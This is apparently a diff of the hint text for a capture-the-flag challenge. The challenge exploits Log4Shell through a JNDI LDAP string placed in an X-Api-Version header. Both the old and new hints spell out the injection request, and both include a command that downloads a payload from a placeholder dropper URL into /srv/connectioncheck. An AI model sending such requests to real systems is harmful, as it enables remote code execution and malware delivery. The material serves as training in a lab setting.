@@ -2,15 +2,13 @@
 
 ### HINT 1
 
-/Basic/Command/Base64 might be a hint! And the challenge said to "encode"… hmm……
+The exploit you need to run is NOT "/Basic/Command/[cmd]"
 
 ### HINT 2
 
-You need to encode the malicious command as base64, and add it to the ldap URL. For example: ${jndi:ldap://YOURIP:1389/Basic/Command/Base64/BASE_64_ENCODED_COMMAND}. If that isn’t working for you, triple-check to make sure that you have encoded the malicious command correctly.
+You need to run the "/Basic/Command/Base64/[base64_encoded_command]" exploit. Therefore, your command will look something like: curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/Command/Base64/[base64_encoded_command]}'.
 
 ### HINT 3
 
-1. Craft the malicious command: curl PAYLOADDROPPERURL --output /srv/connectioncheck
-2. Encode it as base64 using any tool. Base64encode.org is a great option.
-3. Replace it in the command: curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/Command/Base64/PAYLOAD}'
-4. Execute
+Command still not working? Check out the instructions in the Details section again, especially #7. If you're trying to run "curl http://sudosingles-optimizer -H 'X-Api-Version: ${jndi:ldap://YOURIP:1389/Basic/Command/Base64/wget PAYLOADDROPPERURL -O /srv/connectioncheck}'", it will never work. Make sure you substitute PAYLOADDROPPERURL in correctly, and then follow the advice of #6 to achieve victory!
+
